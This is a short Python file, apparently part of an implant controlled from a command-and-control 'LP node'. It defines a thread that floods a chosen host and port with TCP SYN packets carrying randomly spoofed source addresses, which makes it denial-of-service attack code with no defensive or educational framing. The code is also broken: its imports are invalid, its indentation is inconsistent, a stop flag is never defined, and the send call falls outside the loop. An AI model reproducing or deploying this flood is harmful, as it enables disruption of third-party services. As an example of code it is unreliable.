#!/usr/bin/env python

import socket
import random
import sys
import threading
from scapy import scapy.all
import Thread

#
# These functions implement the actions taken by the implant based upon the result of the commands received by from the LP node.
#

class SynFloodThread(Thread):

	def __init__(self, d_host, d_port):
        Thread.__init__(self)
        self.d_host = d_host
        self.d_port = d_port            

	def run(self):

		while not self.stopped:
			ip_segment = IP()
			ip_segment.dst = self.d_host
			# randomize source address
			ip_segment.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))

			tcp_segment = TCP(flags="S")
			tcp_segment.sport = RandShort()
			tcp_segment.dport = int(self.d_port)

        	send(ip_segment/tcp_segment,  verbose=0) # Sends the Packet


def syn_flood( d_host, d_port):

	syn_flood_thread = SynFloodThread(d_host, d_port)
	syn_flood_thread.start()
	# add this thread to the thread pool with 'syn_flood_key'
	return syn_flood_thread
	